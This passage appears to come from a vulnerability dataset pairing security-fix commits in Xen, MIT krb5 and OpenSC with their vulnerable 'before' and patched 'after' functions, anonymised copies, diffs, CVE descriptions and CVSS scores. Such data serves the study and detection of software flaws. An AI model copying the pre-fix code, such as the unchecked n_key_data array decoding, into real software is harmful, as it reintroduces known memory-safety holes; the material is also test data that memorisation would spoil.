    else if ( VAR_66 == -1 )
        VAR_66 = VAR_64 && !VAR_67;

    /* COMMENT_136 */
    if ( !VAR_68 )
        setup_force_cpu_cap(VAR_69);

    /* COMMENT_137 */
                                                            
      
                                                                        
                                                                             
                                                                           
                                                                          
      
                                                                             
                                                                            
       
    if ( VAR_70 == -1 && VAR_64 && !VAR_63 && VAR_4 )
        warning_add(
            ""Booted on L1TF-vulnerable hardware with SMT/Hyperthreading\n""
            ""enabled.  Please assess your configuration and choose an\n""
            ""explicit 'smt=<bool>' setting.  See XSA-273.\n"");

    mds_calculations();

    /* COMMENT_147 */
                                                                              
                                                                          
                               
      
                                                                       
                                                                           
                                
       
    if ( VAR_71 )
        VAR_72 = VAR_73;

    /* COMMENT_156 */
                                                                            
                                                                           
                                              
       
    if ( VAR_74 == -1 )
        VAR_74 = ((VAR_75 || VAR_76) &&
                           boot_cpu_has(VAR_77));
    if ( VAR_78 == -1 )
        VAR_78 = ((VAR_75 || VAR_76) &&
                            boot_cpu_has(VAR_77));

    /* COMMENT_161 */
                                                                             
                                                                         
                                  
      
                                                                              
                                                                           
                                                                             
                                                                     
      
                                                               
                                                                        
                                                                           
       
    if ( VAR_74 || VAR_78 || VAR_72 )
        setup_force_cpu_cap(VAR_79);
    VAR_78 &= !VAR_67 && !VAR_66;

    /* COMMENT_174 */
                                                                           
                                         
       
    if ( VAR_70 == -1 && VAR_75 && VAR_4 )
        warning_add(
            ""Booted on MLPDS/MFBDS-vulnerable hardware with SMT/Hyperthreading\n""
            ""enabled.  Mitigations will not be fully effective.  Please\n""
            ""choose an explicit smt=<bool> setting.  See XSA-297.\n"");

    /* COMMENT_178 */
                                                                
      
                                                                           
                                                                              
                                                                           
                                                                    
                           
      
                                                                             
                                                                              
                                                                              
                                         
      
                                                                           
                                                                             
                                                                              
       
    VAR_5 =
        (VAR_80 || VAR_81) && VAR_82 && !VAR_83;

    /* COMMENT_194 */
                                                                              
                                                                  
      
                                                                             
                                                                              
                                                              
      
                                                                            
                                         
      
                                                                          
                                                                            
                                                                         
                                                                         
                    
       
    if ( VAR_84 == -1 && VAR_5 && VAR_81 &&
         ((VAR_4 && VAR_70) ||
          !boot_cpu_has(VAR_79)) )
    {
        VAR_84 = 0;
        tsx_init();
    }

    /* COMMENT_209 */
                                                                           
               
      
                                                                              
                                                                         
                             
                                                           
                                                                           
                                                             
      
                                                                              
                                                                            
       
    if ( VAR_85 )
    {
        if ( VAR_86 == -1 && !VAR_71 &&
             VAR_82 && !VAR_83 &&
             (!VAR_87 || (VAR_81 && VAR_88)) )
            VAR_86 = 0;

        set_in_mcu_opt_ctrl(VAR_89,
                            VAR_86 ? 0 : VAR_89);
    }

    print_details(VAR_0);

    /* COMMENT_222 */
                                                                             
                                                                              
                                                                              
      
                                                                             
                                                                       
              
       
    if ( VAR_2 )
    {
        struct cpu_info *VAR_90 = get_cpu_info();
        unsigned int VAR_91;

        VAR_92 = !VAR_93 && VAR_33;

        /* COMMENT_231 */
                                                                     
                                                                   
           
        if ( VAR_92 )
        {
            VAR_90->shadow_spec_ctrl = 0;
            barrier();
            VAR_90->spec_ctrl_flags |= VAR_94;
            barrier();
        }

        VAR_91 = VAR_92 ? 0 : VAR_33;

        wrmsrl(VAR_95, VAR_91);
        VAR_90->last_spec_ctrl = VAR_91;
    }
}",,"--- func_before
+++ func_after
@@ -269,6 +269,8 @@
             default_spec_ctrl_flags |= SCF_ist_rsb;
     }
 
+    srso_calculations(hw_smt_enabled);
+
     ibpb_calculations();
 
     /* Check whether Eager FPU should be enabled by default. */","{'deleted_lines': [], 'added_lines': ['    srso_calculations(hw_smt_enabled);', '']}",True,"


A side channel vulnerability on some of the AMD CPUs may allow an attacker to influence the return address prediction. This may result in speculative execution at an attacker-controlledaddress, potentially leading to information disclosure.



















",4.7,MEDIUM,1,valid,2023-06-15T12:46:29Z,4
CVE-2023-20569,['CWE-203'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N,1,xen-project/xen,"x86/spec-ctrl: Mitigate Speculative Return Stack Overflow

On native, synthesise the SRSO bits by probing various hardware properties as
given by AMD.

Extend the IBPB-on-entry mitigations to Zen3/4 CPUs.  There is a microcode
prerequisite to make this an effective mitigation.

This is part of XSA-434 / CVE-2023-20569

Signed-off-by: Andrew Cooper <andrew.cooper3@citrix.com>
Reviewed-by: Jan Beulich <jbeulich@suse.com>
Reviewed-by: Roger Pau Monn <roger.pau@citrix.com>",220c06e6fefe2378f40e2a7391f5e265a2aa50f7,https://github.com/xen-project/xen/commit/220c06e6fefe2378f40e2a7391f5e265a2aa50f7,xen/arch/x86/spec_ctrl.c,ibpb_calculations,"static void __init ibpb_calculations(void)
{
bool def_ibpb_entry = false;
if ( !boot_cpu_has(X86_FEATURE_IBRSB) && !boot_cpu_has(X86_FEATURE_IBPB) )
{
opt_ibpb_entry_hvm = opt_ibpb_entry_pv = opt_ibpb_ctxt_switch = 0;
opt_ibpb_entry_dom0 = false;
return;
}
if ( boot_cpu_data.x86_vendor & (X86_VENDOR_AMD | X86_VENDOR_HYGON) )
{
if ( !boot_cpu_has(X86_FEATURE_IBPB_RET) )
setup_force_cpu_cap(X86_BUG_IBPB_NO_RET);
if ( !boot_cpu_has(X86_FEATURE_BTC_NO) )
def_ibpb_entry = true;
}
if ( opt_ibpb_entry_pv == -1 )
opt_ibpb_entry_pv = IS_ENABLED(CONFIG_PV) && def_ibpb_entry;
if ( opt_ibpb_entry_hvm == -1 )
opt_ibpb_entry_hvm = IS_ENABLED(CONFIG_HVM) && def_ibpb_entry;
if ( opt_ibpb_entry_pv )
{
setup_force_cpu_cap(X86_FEATURE_IBPB_ENTRY_PV);
default_spec_ctrl_flags |= SCF_ist_ibpb;
}
if ( opt_ibpb_entry_hvm )
setup_force_cpu_cap(X86_FEATURE_IBPB_ENTRY_HVM);
if ( opt_ibpb_ctxt_switch == -1 )
opt_ibpb_ctxt_switch = !(opt_ibpb_entry_hvm && opt_ibpb_entry_pv);
}","static void __init ibpb_calculations(void)
{
bool VAR_0 = false;
if ( !boot_cpu_has(VAR_1) && !boot_cpu_has(VAR_2) )
{
VAR_3 = VAR_4 = VAR_5 = 0;
VAR_6 = false;
return;
}
if ( VAR_7.x86_vendor & (VAR_8 | VAR_9) )
{
if ( !boot_cpu_has(VAR_10) )
setup_force_cpu_cap(VAR_11);
if ( !boot_cpu_has(VAR_12) )
VAR_0 = true;
}
if ( VAR_4 == -1 )
VAR_4 = IS_ENABLED(VAR_13) && VAR_0;
if ( VAR_3 == -1 )
VAR_3 = IS_ENABLED(VAR_14) && VAR_0;
if ( VAR_4 )
{
setup_force_cpu_cap(VAR_15);
VAR_16 |= VAR_17;
}
if ( VAR_3 )
setup_force_cpu_cap(VAR_18);
if ( VAR_5 == -1 )
VAR_5 = !(VAR_3 && VAR_4);
}",,"static void __init ibpb_calculations(void)
{
    bool def_ibpb_entry = false;

    /* Check we have hardware IBPB support before using it... */
    if ( !boot_cpu_has(X86_FEATURE_IBRSB) && !boot_cpu_has(X86_FEATURE_IBPB) )
    {
        opt_ibpb_entry_hvm = opt_ibpb_entry_pv = opt_ibpb_ctxt_switch = 0;
        opt_ibpb_entry_dom0 = false;
        return;
    }

    if ( boot_cpu_data.x86_vendor & (X86_VENDOR_AMD | X86_VENDOR_HYGON) )
    {
        /*
         * AMD/Hygon CPUs to date (June 2022) don't flush the RAS.  Future
         * CPUs are expected to enumerate IBPB_RET when this has been fixed.
         * Until then, cover the difference with the software sequence.
         */
        if ( !boot_cpu_has(X86_FEATURE_IBPB_RET) )
            setup_force_cpu_cap(X86_BUG_IBPB_NO_RET);

        /*
         * AMD/Hygon CPUs up to and including Zen2 suffer from Branch Type
         * Confusion.  Mitigate with IBPB-on-entry.
         */
        if ( !boot_cpu_has(X86_FEATURE_BTC_NO) )
            def_ibpb_entry = true;

        /*
         * Further to BTC, Zen3/4 CPUs suffer from Speculative Return Stack
         * Overflow in most configurations.  Mitigate with IBPB-on-entry if we
         * have the microcode that makes this an effective option.
         */
        if ( !boot_cpu_has(X86_FEATURE_SRSO_NO) &&
             boot_cpu_has(X86_FEATURE_IBPB_BRTYPE) )
            def_ibpb_entry = true;
    }

    if ( opt_ibpb_entry_pv == -1 )
        opt_ibpb_entry_pv = IS_ENABLED(CONFIG_PV) && def_ibpb_entry;
    if ( opt_ibpb_entry_hvm == -1 )
        opt_ibpb_entry_hvm = IS_ENABLED(CONFIG_HVM) && def_ibpb_entry;

    if ( opt_ibpb_entry_pv )
    {
        setup_force_cpu_cap(X86_FEATURE_IBPB_ENTRY_PV);

        /*
         * We only need to flush in IST context if we're protecting against PV
         * guests.  HVM IBPB-on-entry protections are both atomic with
         * NMI/#MC, so can't interrupt Xen ahead of having already flushed the
         * BTB.
         */
        default_spec_ctrl_flags |= SCF_ist_ibpb;
    }
    if ( opt_ibpb_entry_hvm )
        setup_force_cpu_cap(X86_FEATURE_IBPB_ENTRY_HVM);

    /*
     * If we're using IBPB-on-entry to protect against PV and HVM guests
     * (ignoring dom0 if trusted), then there's no need to also issue IBPB on
     * context switch too.
     */
    if ( opt_ibpb_ctxt_switch == -1 )
        opt_ibpb_ctxt_switch = !(opt_ibpb_entry_hvm && opt_ibpb_entry_pv);
}","static void __init ibpb_calculations(void)
{
    bool VAR_0 = false;

    /* COMMENT_0 */
    if ( !boot_cpu_has(VAR_1) && !boot_cpu_has(VAR_2) )
    {
        VAR_3 = VAR_4 = VAR_5 = 0;
        VAR_6 = false;
        return;
    }

    if ( VAR_7.x86_vendor & (VAR_8 | VAR_9) )
    {
        /* COMMENT_1 */
                                                                          
                                                                            
                                                                       
           
        if ( !boot_cpu_has(VAR_10) )
            setup_force_cpu_cap(VAR_11);

        /* COMMENT_6 */
                                                                          
                                                   
           
        if ( !boot_cpu_has(VAR_12) )
            VAR_0 = true;

        /* COMMENT_10 */
                                                                           
                                                                              
                                                                  
           
        if ( !boot_cpu_has(VAR_13) &&
             boot_cpu_has(VAR_14) )
            VAR_0 = true;
    }

    if ( VAR_4 == -1 )
        VAR_4 = IS_ENABLED(VAR_15) && VAR_0;
    if ( VAR_3 == -1 )
        VAR_3 = IS_ENABLED(VAR_16) && VAR_0;

    if ( VAR_4 )
    {
        setup_force_cpu_cap(VAR_17);

        /* COMMENT_15 */
                                                                              
                                                                      
                                                                              
               
           
        VAR_18 |= VAR_19;
    }
    if ( VAR_3 )
        setup_force_cpu_cap(VAR_20);

    /* COMMENT_21 */
                                                                        
                                                                             
                          
       
    if ( VAR_5 == -1 )
        VAR_5 = !(VAR_3 && VAR_4);
}",,"--- func_before
+++ func_after
@@ -25,6 +25,15 @@
          * Confusion.  Mitigate with IBPB-on-entry.
          */
         if ( !boot_cpu_has(X86_FEATURE_BTC_NO) )
+            def_ibpb_entry = true;
+
+        /*
+         * Further to BTC, Zen3/4 CPUs suffer from Speculative Return Stack
+         * Overflow in most configurations.  Mitigate with IBPB-on-entry if we
+         * have the microcode that makes this an effective option.
+         */
+        if ( !boot_cpu_has(X86_FEATURE_SRSO_NO) &&
+             boot_cpu_has(X86_FEATURE_IBPB_BRTYPE) )
             def_ibpb_entry = true;
     }
 ","{'deleted_lines': [], 'added_lines': ['            def_ibpb_entry = true;', '', '        /*', '         * Further to BTC, Zen3/4 CPUs suffer from Speculative Return Stack', '         * Overflow in most configurations.  Mitigate with IBPB-on-entry if we', '         * have the microcode that makes this an effective option.', '         */', '        if ( !boot_cpu_has(X86_FEATURE_SRSO_NO) &&', '             boot_cpu_has(X86_FEATURE_IBPB_BRTYPE) )']}",True,"


A side channel vulnerability on some of the AMD CPUs may allow an attacker to influence the return address prediction. This may result in speculative execution at an attacker-controlledaddress, potentially leading to information disclosure.



















",4.7,MEDIUM,1,valid,2023-06-15T12:46:29Z,4
CVE-2023-36054,['CWE-824'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,krb5,"Ensure array count consistency in kadm5 RPC

In _xdr_kadm5_principal_ent_rec(), ensure that n_key_data matches the
key_data array count when decoding.  Otherwise when the structure is
later freed, xdr_array() could iterate over the wrong number of
elements, either leaking some memory or freeing uninitialized
pointers.  Reported by Robert Morris.

CVE-2023-36054:

An authenticated attacker can cause a kadmind process to crash by
freeing uninitialized pointers.  Remote code execution is unlikely.
An attacker with control of a kadmin server can cause a kadmin client
to crash by freeing uninitialized pointers.

ticket: 9099 (new)
tags: pullup
target_version: 1.21-next
target_version: 1.20-next",ef08b09c9459551aabbe7924fb176f1583053cdd,https://github.com/krb5/krb5/commit/ef08b09c9459551aabbe7924fb176f1583053cdd,src/lib/kadm5/kadm_rpc_xdr.c,_xdr_kadm5_principal_ent_rec,"static bool_t
_xdr_kadm5_principal_ent_rec(XDR *xdrs, kadm5_principal_ent_rec *objp,
int v)
{
unsigned int n;
if (!xdr_krb5_principal(xdrs, &objp->principal)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(xdrs, &objp->princ_expire_time)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(xdrs, &objp->last_pwd_change)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(xdrs, &objp->pw_expiration)) {
return (FALSE);
}
if (!xdr_krb5_deltat(xdrs, &objp->max_life)) {
return (FALSE);
}
if (!xdr_nulltype(xdrs, (void **) &objp->mod_name,
xdr_krb5_principal)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(xdrs, &objp->mod_date)) {
return (FALSE);
}
if (!xdr_krb5_flags(xdrs, &objp->attributes)) {
return (FALSE);
}
if (!xdr_krb5_kvno(xdrs, &objp->kvno)) {
return (FALSE);
}
if (!xdr_krb5_kvno(xdrs, &objp->mkvno)) {
return (FALSE);
}
if (!xdr_nullstring(xdrs, &objp->policy)) {
return (FALSE);
}
if (!xdr_long(xdrs, &objp->aux_attributes)) {
return (FALSE);
}
if (!xdr_krb5_deltat(xdrs, &objp->max_renewable_life)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(xdrs, &objp->last_success)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(xdrs, &objp->last_failed)) {
return (FALSE);
}
if (!xdr_krb5_kvno(xdrs, &objp->fail_auth_count)) {
return (FALSE);
}
if (!xdr_krb5_int16(xdrs, &objp->n_key_data)) {
return (FALSE);
}
if (!xdr_krb5_int16(xdrs, &objp->n_tl_data)) {
return (FALSE);
}
if (!xdr_nulltype(xdrs, (void **) &objp->tl_data,
xdr_krb5_tl_data)) {
return FALSE;
}
n = objp->n_key_data;
if (!xdr_array(xdrs, (caddr_t *) &objp->key_data,
&n, ~0, sizeof(krb5_key_data),
xdr_krb5_key_data_nocontents)) {
return (FALSE);
}
return (TRUE);
}","static bool_t
_xdr_kadm5_principal_ent_rec(XDR *VAR_0, kadm5_principal_ent_rec *VAR_1,
int VAR_2)
{
unsigned int VAR_3;
if (!xdr_krb5_principal(VAR_0, &VAR_1->principal)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(VAR_0, &VAR_1->princ_expire_time)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(VAR_0, &VAR_1->last_pwd_change)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(VAR_0, &VAR_1->pw_expiration)) {
return (FALSE);
}
if (!xdr_krb5_deltat(VAR_0, &VAR_1->max_life)) {
return (FALSE);
}
if (!xdr_nulltype(VAR_0, (void **) &VAR_1->mod_name,
VAR_4)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(VAR_0, &VAR_1->mod_date)) {
return (FALSE);
}
if (!xdr_krb5_flags(VAR_0, &VAR_1->attributes)) {
return (FALSE);
}
if (!xdr_krb5_kvno(VAR_0, &VAR_1->kvno)) {
return (FALSE);
}
if (!xdr_krb5_kvno(VAR_0, &VAR_1->mkvno)) {
return (FALSE);
}
if (!xdr_nullstring(VAR_0, &VAR_1->policy)) {
return (FALSE);
}
if (!xdr_long(VAR_0, &VAR_1->aux_attributes)) {
return (FALSE);
}
if (!xdr_krb5_deltat(VAR_0, &VAR_1->max_renewable_life)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(VAR_0, &VAR_1->last_success)) {
return (FALSE);
}
if (!xdr_krb5_timestamp(VAR_0, &VAR_1->last_failed)) {
return (FALSE);
}
if (!xdr_krb5_kvno(VAR_0, &VAR_1->fail_auth_count)) {
return (FALSE);
}
if (!xdr_krb5_int16(VAR_0, &VAR_1->n_key_data)) {
return (FALSE);
}
if (!xdr_krb5_int16(VAR_0, &VAR_1->n_tl_data)) {
return (FALSE);
}
if (!xdr_nulltype(VAR_0, (void **) &VAR_1->tl_data,
VAR_5)) {
return FALSE;
}
VAR_3 = VAR_1->n_key_data;
if (!xdr_array(VAR_0, (caddr_t *) &VAR_1->key_data,
&VAR_3, ~0, sizeof(VAR_6),
VAR_7)) {
return (FALSE);
}
return (TRUE);
}",krb5/ef08b09c9459551aabbe7924fb176f1583053cdd/kadm_rpc_xdr.c/vul/before/0.json,"static bool_t
_xdr_kadm5_principal_ent_rec(XDR *xdrs, kadm5_principal_ent_rec *objp,
			     int v)
{
	unsigned int n;
	bool_t r;

	if (!xdr_krb5_principal(xdrs, &objp->principal)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(xdrs, &objp->princ_expire_time)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(xdrs, &objp->last_pwd_change)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(xdrs, &objp->pw_expiration)) {
		return (FALSE);
	}
	if (!xdr_krb5_deltat(xdrs, &objp->max_life)) {
		return (FALSE);
	}
	if (!xdr_nulltype(xdrs, (void **) &objp->mod_name,
			  xdr_krb5_principal)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(xdrs, &objp->mod_date)) {
		return (FALSE);
	}
	if (!xdr_krb5_flags(xdrs, &objp->attributes)) {
		return (FALSE);
	}
	if (!xdr_krb5_kvno(xdrs, &objp->kvno)) {
		return (FALSE);
	}
	if (!xdr_krb5_kvno(xdrs, &objp->mkvno)) {
		return (FALSE);
	}
	if (!xdr_nullstring(xdrs, &objp->policy)) {
		return (FALSE);
	}
	if (!xdr_long(xdrs, &objp->aux_attributes)) {
		return (FALSE);
	}
	if (!xdr_krb5_deltat(xdrs, &objp->max_renewable_life)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(xdrs, &objp->last_success)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(xdrs, &objp->last_failed)) {
		return (FALSE);
	}
	if (!xdr_krb5_kvno(xdrs, &objp->fail_auth_count)) {
		return (FALSE);
	}
	if (!xdr_krb5_int16(xdrs, &objp->n_key_data)) {
		return (FALSE);
	}
	if (xdrs->x_op == XDR_DECODE && objp->n_key_data < 0) {
		return (FALSE);
	}
	if (!xdr_krb5_int16(xdrs, &objp->n_tl_data)) {
		return (FALSE);
	}
	if (!xdr_nulltype(xdrs, (void **) &objp->tl_data,
			  xdr_krb5_tl_data)) {
		return FALSE;
	}
	n = objp->n_key_data;
	r = xdr_array(xdrs, (caddr_t *) &objp->key_data, &n, objp->n_key_data,
		      sizeof(krb5_key_data), xdr_krb5_key_data_nocontents);
	objp->n_key_data = n;
	if (!r) {
		return (FALSE);
	}

	return (TRUE);
}","static bool_t
_xdr_kadm5_principal_ent_rec(XDR *VAR_0, kadm5_principal_ent_rec *VAR_1,
			     int VAR_2)
{
	unsigned int VAR_3;
	bool_t VAR_4;

	if (!xdr_krb5_principal(VAR_0, &VAR_1->principal)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(VAR_0, &VAR_1->princ_expire_time)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(VAR_0, &VAR_1->last_pwd_change)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(VAR_0, &VAR_1->pw_expiration)) {
		return (FALSE);
	}
	if (!xdr_krb5_deltat(VAR_0, &VAR_1->max_life)) {
		return (FALSE);
	}
	if (!xdr_nulltype(VAR_0, (void **) &VAR_1->mod_name,
			  VAR_5)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(VAR_0, &VAR_1->mod_date)) {
		return (FALSE);
	}
	if (!xdr_krb5_flags(VAR_0, &VAR_1->attributes)) {
		return (FALSE);
	}
	if (!xdr_krb5_kvno(VAR_0, &VAR_1->kvno)) {
		return (FALSE);
	}
	if (!xdr_krb5_kvno(VAR_0, &VAR_1->mkvno)) {
		return (FALSE);
	}
	if (!xdr_nullstring(VAR_0, &VAR_1->policy)) {
		return (FALSE);
	}
	if (!xdr_long(VAR_0, &VAR_1->aux_attributes)) {
		return (FALSE);
	}
	if (!xdr_krb5_deltat(VAR_0, &VAR_1->max_renewable_life)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(VAR_0, &VAR_1->last_success)) {
		return (FALSE);
	}
	if (!xdr_krb5_timestamp(VAR_0, &VAR_1->last_failed)) {
		return (FALSE);
	}
	if (!xdr_krb5_kvno(VAR_0, &VAR_1->fail_auth_count)) {
		return (FALSE);
	}
	if (!xdr_krb5_int16(VAR_0, &VAR_1->n_key_data)) {
		return (FALSE);
	}
	if (VAR_0->x_op == VAR_6 && VAR_1->n_key_data < 0) {
		return (FALSE);
	}
	if (!xdr_krb5_int16(VAR_0, &VAR_1->n_tl_data)) {
		return (FALSE);
	}
	if (!xdr_nulltype(VAR_0, (void **) &VAR_1->tl_data,
			  VAR_7)) {
		return FALSE;
	}
	VAR_3 = VAR_1->n_key_data;
	VAR_4 = xdr_array(VAR_0, (caddr_t *) &VAR_1->key_data, &VAR_3, VAR_1->n_key_data,
		      sizeof(VAR_8), VAR_9);
	VAR_1->n_key_data = VAR_3;
	if (!VAR_4) {
		return (FALSE);
	}

	return (TRUE);
}",krb5/ef08b09c9459551aabbe7924fb176f1583053cdd/kadm_rpc_xdr.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -3,6 +3,7 @@
 			     int v)
 {
 	unsigned int n;
+	bool_t r;
 
 	if (!xdr_krb5_principal(xdrs, &objp->principal)) {
 		return (FALSE);
@@ -56,6 +57,9 @@
 	if (!xdr_krb5_int16(xdrs, &objp->n_key_data)) {
 		return (FALSE);
 	}
+	if (xdrs->x_op == XDR_DECODE && objp->n_key_data < 0) {
+		return (FALSE);
+	}
 	if (!xdr_krb5_int16(xdrs, &objp->n_tl_data)) {
 		return (FALSE);
 	}
@@ -64,9 +68,10 @@
 		return FALSE;
 	}
 	n = objp->n_key_data;
-	if (!xdr_array(xdrs, (caddr_t *) &objp->key_data,
-		       &n, ~0, sizeof(krb5_key_data),
-		       xdr_krb5_key_data_nocontents)) {
+	r = xdr_array(xdrs, (caddr_t *) &objp->key_data, &n, objp->n_key_data,
+		      sizeof(krb5_key_data), xdr_krb5_key_data_nocontents);
+	objp->n_key_data = n;
+	if (!r) {
 		return (FALSE);
 	}
 ","{'deleted_lines': ['\tif (!xdr_array(xdrs, (caddr_t *) &objp->key_data,', '\t\t       &n, ~0, sizeof(krb5_key_data),', '\t\t       xdr_krb5_key_data_nocontents)) {'], 'added_lines': ['\tbool_t r;', '\tif (xdrs->x_op == XDR_DECODE && objp->n_key_data < 0) {', '\t\treturn (FALSE);', '\t}', '\tr = xdr_array(xdrs, (caddr_t *) &objp->key_data, &n, objp->n_key_data,', '\t\t      sizeof(krb5_key_data), xdr_krb5_key_data_nocontents);', '\tobjp->n_key_data = n;', '\tif (!r) {']}",True,lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.,6.5,MEDIUM,1,valid,2023-06-21T14:57:39Z,4
CVE-2023-4535,['CWE-125'],CVSS:3.1/AV:P/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L,1,OpenSC,"myeid: fixed CID 380538  Out-of-bounds read (OVERRUN)

also fixes output buffer size checking",f1993dc4e0b33050b8f72a3558ee88b24c4063b2,https://github.com/OpenSC/OpenSC/commit/f1993dc4e0b33050b8f72a3558ee88b24c4063b2,src/libopensc/card-myeid.c,myeid_enc_dec_sym,"static int
myeid_enc_dec_sym(struct sc_card *card, const u8 *data, size_t datalen,
u8 *out, size_t *outlen, int decipher)
{
struct sc_context *ctx;
struct sc_apdu apdu;
u8 rbuf[SC_MAX_APDU_BUFFER_SIZE];
u8 sbuf[SC_MAX_APDU_BUFFER_SIZE];
u8 *sdata;
int r, padding = 0, cbc = 0;
size_t block_size;
size_t len, rest_len;
size_t return_len = 0;
size_t max_apdu_datalen;
size_t apdu_datalen;
assert(card != NULL);
ctx = card->ctx;
LOG_FUNC_CALLED(ctx);
myeid_private_data_t *priv;
priv = (myeid_private_data_t *)card->drv_data;
max_apdu_datalen = sc_get_max_send_size(card);
if (max_apdu_datalen > sc_get_max_recv_size(card))
max_apdu_datalen = sc_get_max_recv_size(card);
if (max_apdu_datalen > SC_MAX_APDU_BUFFER_SIZE)
max_apdu_datalen = SC_MAX_APDU_BUFFER_SIZE;
sc_log(ctx, ""algorithm %d algorithm_flags %x"", priv->algorithm, priv->algorithm_flags);
if (outlen == NULL) {
sc_log(ctx, ""%s (symmetric key) initialized"", decipher ? ""C_DecryptInit"" : ""C_EncryptInit"");
priv->sym_crypt_buffer_len = 0;
priv->sym_plain_buffer_len = 0;
return SC_SUCCESS;
}
switch (priv->algorithm) {
case SC_ALGORITHM_AES:
block_size = 16;
if (priv->algorithm_flags & SC_ALGORITHM_AES_ECB) {
padding = 0;
cbc = 0;
} else if (priv->algorithm_flags & SC_ALGORITHM_AES_CBC) {
padding = 0;
cbc = 1;
} else if (priv->algorithm_flags & SC_ALGORITHM_AES_CBC_PAD) {
padding = 1;
cbc = 1;
}
break;
default:
LOG_FUNC_RETURN(ctx, SC_ERROR_NOT_SUPPORTED);
}
if (cbc)
max_apdu_datalen -= max_apdu_datalen % block_size;
else
max_apdu_datalen = block_size;
rest_len = priv->sym_crypt_buffer_len;
if (data == NULL) {
if (datalen != 0)
LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
if (decipher) {
if (priv->sym_plain_buffer_len != block_size)
LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
if (rest_len)
LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
return_len = block_size;
if (padding) {
uint8_t i, pad_byte = *(priv->sym_plain_buffer + block_size - 1);
sc_log(ctx, ""Found padding byte %02x"", pad_byte);
if (pad_byte == 0 || pad_byte > block_size)
LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_PADDING);
sdata = priv->sym_plain_buffer + block_size - pad_byte;
for (i = 0; i < pad_byte; i++)
if (sdata[i] != pad_byte)
LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_PADDING);
return_len = block_size - pad_byte;
}
*outlen = return_len;
if (out == NULL)
LOG_FUNC_RETURN(ctx, SC_SUCCESS);
if (return_len > *outlen)
LOG_FUNC_RETURN(ctx, SC_ERROR_BUFFER_TOO_SMALL);
memcpy(out, priv->sym_plain_buffer, return_len);
sc_log(ctx, ""C_DecryptFinal %zu bytes"", *outlen);
return SC_SUCCESS;
} else {
if (padding) {
uint8_t pad_byte = block_size - rest_len;
sc_log(ctx, ""Generating padding, padding byte: %d"", pad_byte);
sdata = priv->sym_crypt_buffer + rest_len;
memset(sdata, pad_byte, pad_byte);
rest_len = block_size;
} else if (rest_len) {
LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
}
}
}
len = datalen + rest_len;
sc_log(ctx, ""datalen=%zu rest_len=%zu len=%zu outlen=%zu"", datalen, rest_len, len, *outlen);
len -= (len % block_size);
*outlen = len;
if (out == NULL)
LOG_FUNC_RETURN(ctx, SC_SUCCESS);
if (*outlen < len)
LOG_FUNC_RETURN(ctx, SC_ERROR_BUFFER_TOO_SMALL);
while (len >= block_size) {
if (!decipher)
sc_format_apdu(card, &apdu, SC_APDU_CASE_4_SHORT, 0x2A, 0x84, 0x80);
else
sc_format_apdu(card, &apdu, SC_APDU_CASE_4_SHORT, 0x2A, 0x80, 0x84);
apdu.cla = 0;
if (len > max_apdu_datalen)
apdu_datalen = max_apdu_datalen;
else
apdu_datalen = len;
if (cbc)
apdu.cla = 0x10;
len -= apdu_datalen;
sdata = sbuf;
apdu.le = apdu_datalen;
apdu.lc = apdu_datalen;
apdu.datalen = apdu_datalen;
apdu.data = sbuf;
apdu.resplen = sizeof(rbuf);
apdu.resp = rbuf;
if (rest_len) {
memcpy(sbuf, priv->sym_crypt_buffer, rest_len);
sdata += rest_len;
apdu_datalen -= rest_len;
priv->sym_crypt_buffer_len = 0;
rest_len = 0;
}
if (data) {
memcpy(sdata, data, apdu_datalen);
data += apdu_datalen;
datalen -= apdu_datalen;
}
r = sc_transmit_apdu(card, &apdu);
LOG_TEST_RET(ctx, r, ""APDU transmit failed"");
r = sc_check_sw(card, apdu.sw1, apdu.sw2);
LOG_TEST_RET(ctx, r, ""decrypt_sym/encrypt_sym failed"");
if (apdu.resplen != apdu.datalen)
LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
memcpy(out, apdu.resp, apdu.resplen);
out += apdu.resplen;
return_len += apdu.resplen;
}
if (decipher) {
uint8_t tmp_buf[16];
if (return_len >= block_size) {
memcpy(tmp_buf, out - block_size, block_size);
if (priv->sym_plain_buffer_len) {
sc_log(ctx, ""inserting block from previous decrypt"");
memmove(out - return_len + block_size, out - return_len, return_len - block_size);
memcpy(out - return_len, priv->sym_plain_buffer, block_size);
} else
return_len -= block_size;
memcpy(priv->sym_plain_buffer, tmp_buf, block_size);
priv->sym_plain_buffer_len = block_size;
} else
